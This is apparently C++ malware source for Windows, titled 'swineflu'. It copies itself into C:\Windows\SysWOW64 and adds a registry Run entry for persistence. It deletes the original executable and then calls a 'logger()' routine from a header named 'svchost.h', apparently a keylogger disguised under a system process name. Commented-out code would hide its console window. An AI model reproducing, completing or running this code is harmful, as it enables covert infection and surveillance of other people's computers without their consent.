// swineflu.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <string.h>


#include <sstream>
#include <string>

#include "Shlwapi.h"


#include <iostream>
#include "svchost.h"
#include <tchar.h>


using namespace std;

string ExePath() {
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}

void addRunEntry()
{
	RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);

	HKEY hKey = NULL;
	DWORD rtime;

	//Step 1: Open the key
	long sts = RegOpenKeyEx(HKEY_CURRENT_USER, "swinef1", 0, KEY_READ, &hKey);

	//Step 2: If failed, create the key
	if (ERROR_NO_MATCH == sts || ERROR_FILE_NOT_FOUND == sts)
	{
		cout << "Creating registry key " << "swinef1" << endl;

		long j = RegCreateKeyEx(HKEY_CURRENT_USER, "swinef1", 0L, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

		if (ERROR_SUCCESS != j)
			cout << "Error: Could not create registry key " << "swinef1" << endl << "\tERROR: " << j << endl;
		else
			cout << "Success: Key created" << endl;

		rtime = 0;

		printf("created reg key");

		string str = ExePath();
		printf(str.c_str());
		str.append("\\swineflu.exe");

		int unlucksic = _unlink(
			str.c_str()
			);

		if (!unlucksic)
		{
			printf("did not work");
		}
	}
	else
	{
		printf("reg exists");
	}
}



void adminstartup()
{
	HKEY hkey;
	DWORD dwDispoition;

	string str = ExePath();
	printf(str.c_str());
	str.append("\\swineflu.exe");

	BOOL b = CopyFile(str.c_str(),
		"C:\\Windows\\SysWOW64\\swineflu.exe", 0);
	if (!b) {

		
		
		printf("%d\n", GetLastError());
	}
	else {
		printf("okay\n");
	}

	addRunEntry();

	
}


int _tmain(int argc, _TCHAR* argv[])
{
	//HWND stealth; /*creating stealth (window is not visible)*/
	//AllocConsole();
	//stealth = FindWindowA("ConsoleWindowClass", NULL);
	//ShowWindow(stealth, 0);
	printf("wear your mask please\n");
	adminstartup();
	logger();

	// getchar();
	return 0;
}


